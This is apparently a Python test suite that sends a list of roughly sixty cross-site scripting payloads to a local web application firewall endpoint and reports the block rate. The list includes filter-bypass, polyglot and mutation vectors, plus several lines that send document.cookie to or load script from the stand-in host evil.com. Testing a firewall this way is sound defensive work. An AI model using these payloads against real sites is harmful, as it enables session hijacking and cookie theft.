#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) Attack Test Suite
Tests various XSS techniques against the WAF
"""

import requests
import json
import time
from typing import Dict

WAF_API = "http://localhost:3001/api/waf/check"

# XSS Payloads - Various techniques
XSS_ATTACKS = [
    # Basic Script Tags
    {"name": "Basic script alert", "path": "/api/comment", "body": "<script>alert('XSS')</script>"},
    {"name": "Script with src", "path": "/api/post", "body": "<script src='http://evil.com/xss.js'></script>"},
    {"name": "Script document.cookie", "path": "/api/feedback", "body": "<script>document.location='http://evil.com/?c='+document.cookie</script>"},

    # Event Handlers
    {"name": "IMG onerror", "path": "/api/avatar", "body": "<img src=x onerror=alert('XSS')>"},
    {"name": "IMG onload", "path": "/api/image", "body": "<img src='valid.jpg' onload='alert(1)'>"},
    {"name": "Body onload", "path": "/api/page", "body": "<body onload=alert('XSS')>"},
    {"name": "SVG onload", "path": "/api/icon", "body": "<svg onload=alert('XSS')>"},
    {"name": "Input onfocus", "path": "/api/search", "query": {"q": "<input onfocus=alert(1) autofocus>"}},
    {"name": "Marquee onstart", "path": "/api/banner", "body": "<marquee onstart=alert('XSS')>"},
    {"name": "Video onerror", "path": "/api/media", "body": "<video><source onerror=alert(1)>"},
    {"name": "Details ontoggle", "path": "/api/info", "body": "<details open ontoggle=alert(1)>"},
    {"name": "Select onchange", "path": "/api/form", "body": "<select onchange=alert(1)><option>1</option></select>"},

    # JavaScript Protocol
    {"name": "Anchor javascript:", "path": "/api/link", "body": "<a href='javascript:alert(1)'>click</a>"},
    {"name": "Iframe javascript:", "path": "/api/embed", "body": "<iframe src='javascript:alert(1)'>"},
    {"name": "Form action javascript:", "path": "/api/submit", "body": "<form action='javascript:alert(1)'><input type=submit>"},
    {"name": "Object data javascript:", "path": "/api/widget", "body": "<object data='javascript:alert(1)'>"},

    # Data URI
    {"name": "Anchor data URI", "path": "/api/download", "body": "<a href='data:text/html,<script>alert(1)</script>'>click</a>"},
    {"name": "Iframe data URI", "path": "/api/frame", "body": "<iframe src='data:text/html,<script>alert(1)</script>'>"},
    {"name": "Object data URI", "path": "/api/obj", "body": "<object data='data:text/html,<script>alert(1)</script>'>"},

    # SVG XSS
    {"name": "SVG script", "path": "/api/graphic", "body": "<svg><script>alert('XSS')</script></svg>"},
    {"name": "SVG animate", "path": "/api/animation", "body": "<svg><animate onbegin=alert(1)>"},
    {"name": "SVG set", "path": "/api/svg", "body": "<svg><set onbegin=alert(1)>"},
    {"name": "SVG foreignObject", "path": "/api/vector", "body": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>"},

    # HTML5 Vectors
    {"name": "Audio onerror", "path": "/api/audio", "body": "<audio src=x onerror=alert(1)>"},
    {"name": "Video poster", "path": "/api/video", "body": "<video poster=javascript:alert(1)>"},
    {"name": "Math XSS", "path": "/api/math", "body": "<math><maction actiontype='statusline#http://evil.com'>click</maction></math>"},
    {"name": "Template injection", "path": "/api/template", "body": "<template><script>alert(1)</script></template>"},

    # Encoded XSS
    {"name": "HTML entity script", "path": "/api/text", "body": "&lt;script&gt;alert(1)&lt;/script&gt;"},
    {"name": "Unicode escape", "path": "/api/input", "body": "<script>\\u0061lert(1)</script>"},
    {"name": "Hex encoding", "path": "/api/data", "body": "<script>&#x61;lert(1)</script>"},
    {"name": "Decimal encoding", "path": "/api/content", "body": "<script>&#97;lert(1)</script>"},
    {"name": "Base64 eval", "path": "/api/exec", "body": "<script>eval(atob('YWxlcnQoMSk='))</script>"},
    {"name": "URL encoded", "path": "/api/search", "query": {"q": "%3Cscript%3Ealert(1)%3C/script%3E"}},

    # DOM-based XSS
    {"name": "DOM innerHTML", "path": "/api/render", "body": "<div id=x></div><script>x.innerHTML='<img src=x onerror=alert(1)>'</script>"},
    {"name": "DOM document.write", "path": "/api/write", "body": "<script>document.write('<img src=x onerror=alert(1)>')</script>"},
    {"name": "DOM location.hash", "path": "/api/page#<script>alert(1)</script>", "body": ""},
    {"name": "DOM window.name", "path": "/api/frame", "body": "<script>window.name='<script>alert(1)<\\/script>'</script>"},

    # Filter Bypass Techniques
    {"name": "Case bypass", "path": "/api/test", "body": "<ScRiPt>alert(1)</sCrIpT>"},
    {"name": "Null byte", "path": "/api/test", "body": "<scr%00ipt>alert(1)</scr%00ipt>"},
    {"name": "Double encoding", "path": "/api/test", "body": "%253Cscript%253Ealert(1)%253C/script%253E"},
    {"name": "Newline bypass", "path": "/api/test", "body": "<scr\nipt>alert(1)</scr\nipt>"},
    {"name": "Tab bypass", "path": "/api/test", "body": "<scr\tipt>alert(1)</scr\tipt>"},
    {"name": "Comment bypass", "path": "/api/test", "body": "<scr<!--comment-->ipt>alert(1)</script>"},
    {"name": "Backtick bypass", "path": "/api/test", "body": "<script>alert`1`</script>"},

    # Polyglot XSS
    {"name": "Polyglot 1", "path": "/api/poly", "body": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"},
    {"name": "Polyglot 2", "path": "/api/poly", "body": "'\"-->]]>*/</script></style></textarea></title><img src=x onerror=alert(1)>"},
    {"name": "Polyglot 3", "path": "/api/poly", "body": "\"'><script>alert(String.fromCharCode(88,83,83))</script>"},

    # Mutation XSS
    {"name": "mXSS noscript", "path": "/api/safe", "body": "<noscript><p title='</noscript><script>alert(1)</script>'>"},
    {"name": "mXSS style", "path": "/api/css", "body": "<style><style/><script>alert(1)</script>"},
    {"name": "mXSS title", "path": "/api/meta", "body": "<title><title/><script>alert(1)</script>"},

    # Exotic Vectors
    {"name": "Expression CSS", "path": "/api/style", "body": "<div style='background:url(javascript:alert(1))'>"},
    {"name": "VBScript", "path": "/api/ie", "body": "<script language='vbscript'>MsgBox 'XSS'</script>"},
    {"name": "XML data island", "path": "/api/xml", "body": "<xml><script>alert(1)</script></xml>"},
    {"name": "CDATA injection", "path": "/api/cdata", "body": "<![CDATA[<script>alert(1)</script>]]>"},

    # Hidden in legitimate content
    {"name": "Comment XSS", "path": "/api/comments", "body": {"text": "Great product! <script>fetch('http://evil.com?c='+document.cookie)</script>"}},
    {"name": "Profile bio XSS", "path": "/api/profile", "body": {"bio": "Hello! <img src=x onerror=alert(document.domain)>"}},
    {"name": "Review XSS", "path": "/api/reviews", "body": {"review": "5 stars! <svg/onload=alert('XSS')>", "rating": 5}},
]

def test_payload(attack: Dict) -> Dict:
    """Test a single XSS payload against WAF"""
    payload = {
        "method": "POST" if "body" in attack and attack["body"] else "GET",
        "path": attack["path"],
        "query_params": attack.get("query", {}),
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Accept": "text/html,application/xhtml+xml",
            "Content-Type": "application/json"
        }
    }

    body = attack.get("body", "")
    if body:
        payload["body"] = json.dumps(body) if isinstance(body, dict) else body

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0)
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}

def main():
    print("=" * 70)
    print("XSS (CROSS-SITE SCRIPTING) ATTACK TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(XSS_ATTACKS)} XSS payloads...\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(XSS_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(f"[{i:02d}/{len(XSS_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}")
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(XSS_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = detected / (len(XSS_ATTACKS) - errors) * 100 if (len(XSS_ATTACKS) - errors) > 0 else 0
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)

if __name__ == "__main__":
    main()
